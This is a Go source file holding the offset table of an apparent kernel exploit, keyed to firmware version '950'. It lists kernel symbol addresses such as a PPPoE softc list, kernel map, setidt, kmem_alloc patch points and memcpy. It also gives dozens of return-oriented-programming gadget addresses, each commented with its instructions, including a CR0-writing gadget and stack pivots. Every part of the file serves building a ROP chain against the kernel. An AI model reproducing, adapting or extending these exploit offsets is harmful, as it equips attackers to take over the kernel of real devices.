package main

type Offset struct {
	PPPOE_SOFTC_LIST                             uint64
	KERNEL_MAP                                   uint64
	SETIDT                                       uint64
	KMEM_ALLOC                                   uint64
	KMEM_ALLOC_PATCH1                            uint64
	KMEM_ALLOC_PATCH2                            uint64
	MEMCPY                                       uint64
	MOV_CR0_RSI_UD2_MOV_EAX_1_RET                uint64
	SECOND_GADGET_OFF                            uint64
	FIRST_GADGET                                 uint64
	PUSH_RBP_JMP_QWORD_PTR_RSI                   uint64
	POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 uint64
	LEA_RSP_RSI_20_REPZ_RET                      uint64
	ADD_RSP_28_POP_RBP_RET                       uint64
	ADD_RSP_B0_POP_RBP_RET                       uint64
	RET                                          uint64
	POP_RDI_RET                                  uint64
	POP_RSI_RET                                  uint64
	POP_RDX_RET                                  uint64
	POP_RCX_RET                                  uint64
	POP_R8_POP_RBP_RET                           uint64
	POP_R12_RET                                  uint64
	POP_RAX_RET                                  uint64
	POP_RBP_RET                                  uint64
	PUSH_RSP_POP_RSI_RET                         uint64
	MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX        uint64
	MOV_BYTE_PTR_RCX_AL_RET                      uint64
	MOV_RDI_RBX_CALL_R12                         uint64
	MOV_RDI_R14_CALL_R12                         uint64
	MOV_RSI_RBX_CALL_RAX                         uint64
	MOV_R14_RAX_CALL_R8                          uint64
	ADD_RDI_RCX_RET                              uint64
	SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET          uint64
	JMP_R14                                      uint64
}

var FirmwareOffsets = map[string]Offset{
	"950": {
		PPPOE_SOFTC_LIST:              0xffffffff8434c0a8,
		KERNEL_MAP:                    0xffffffff84347830,
		SETIDT:                        0xffffffff8254d320,
		KMEM_ALLOC:                    0xffffffff823889d0,
		KMEM_ALLOC_PATCH1:             0xffffffff82388a9c,
		KMEM_ALLOC_PATCH2:             0xffffffff82388aa4,
		MEMCPY:                        0xffffffff82401cc0,
		MOV_CR0_RSI_UD2_MOV_EAX_1_RET: 0xffffffff822bea79,
		SECOND_GADGET_OFF:             0x3b,
		// 0xffffffff822c53cd : jmp qword ptr [rsi + 0x3b]
		FIRST_GADGET: 0xffffffff822c53cd,
		// 0xffffffff82c6ec06 : push rbp ; jmp qword ptr [rsi]
		PUSH_RBP_JMP_QWORD_PTR_RSI: 0xffffffff82c6ec06,
		// 0xffffffff822bf041 : pop rbx ; pop r14 ; pop rbp ; jmp qword ptr [rsi + 0x10]
		POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10: 0xffffffff822bf041,
		// 0xffffffff82935fc6 : lea rsp, [rsi + 0x20] ; repz ret
		LEA_RSP_RSI_20_REPZ_RET: 0xffffffff82935fc6,
		// 0xffffffff826adfda : add rsp, 0x28 ; pop rbp ; ret
		ADD_RSP_28_POP_RBP_RET: 0xffffffff826adfda,
		// 0xffffffff82584c1f : add rsp, 0xb0 ; pop rbp ; ret
		ADD_RSP_B0_POP_RBP_RET: 0xffffffff82584c1f,
		// 0xffffffff822008e0 : ret
		RET: 0xffffffff822008e0,
		// 0xffffffff82315161 : pop rdi ; ret
		POP_RDI_RET: 0xffffffff82315161,
		// 0xffffffff822dd859 : pop rsi ; ret
		POP_RSI_RET: 0xffffffff822dd859,
		// 0xffffffff822cad55 : pop rdx ; ret
		POP_RDX_RET: 0xffffffff822cad55,
		// 0xffffffff8222d707 : pop rcx ; ret
		POP_RCX_RET: 0xffffffff8222d707,
		// 0xffffffff8220fec7 : pop r8 ; pop rbp ; ret
		POP_R8_POP_RBP_RET: 0xffffffff8220fec7,
		// 0xffffffff8279f14f : pop r12 ; ret
		POP_R12_RET: 0xffffffff8279f14f,
		// 0xffffffff8223a7fe : pop rax ; ret
		POP_RAX_RET: 0xffffffff8223a7fe,
		// 0xffffffff822008df : pop rbp ; ret
		POP_RBP_RET: 0xffffffff822008df,
		// 0xffffffff82bad912 : push rsp ; pop rsi ; ret
		PUSH_RSP_POP_RSI_RET: 0xffffffff82bad912,
		// 0xffffffff8235fea0 : mov rdi, qword ptr [rdi] ; pop rbp ; jmp rax
		MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX: 0xffffffff8235fea0,
		// 0xffffffff824f2458 : mov byte ptr [rcx], al ; ret
		MOV_BYTE_PTR_RCX_AL_RET: 0xffffffff824f2458,
		// 0xffffffff822524dc : mov rdi, rbx ; call r12
		MOV_RDI_RBX_CALL_R12: 0xffffffff822524dc,
		// 0xffffffff82252317 : mov rdi, r14 ; call r12
		MOV_RDI_R14_CALL_R12: 0xffffffff82252317,
		// 0xffffffff824a07ae : mov rsi, rbx ; call rax
		MOV_RSI_RBX_CALL_RAX: 0xffffffff824a07ae,
		// 0xffffffff82567228 : mov r14, rax ; call r8
		MOV_R14_RAX_CALL_R8: 0xffffffff82567228,
		// 0xffffffff82caedfa : add rdi, rcx ; ret
		ADD_RDI_RCX_RET: 0xffffffff82caedfa,
		// 0xffffffff82333437 : sub rsi, rdx ; mov rax, rsi ; pop rbp ; ret
		SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET: 0xffffffff82333437,
		// 0xffffffff82b7c6e7 : jmp r14
		JMP_R14: 0xffffffff82b7c6e7,
	},
}
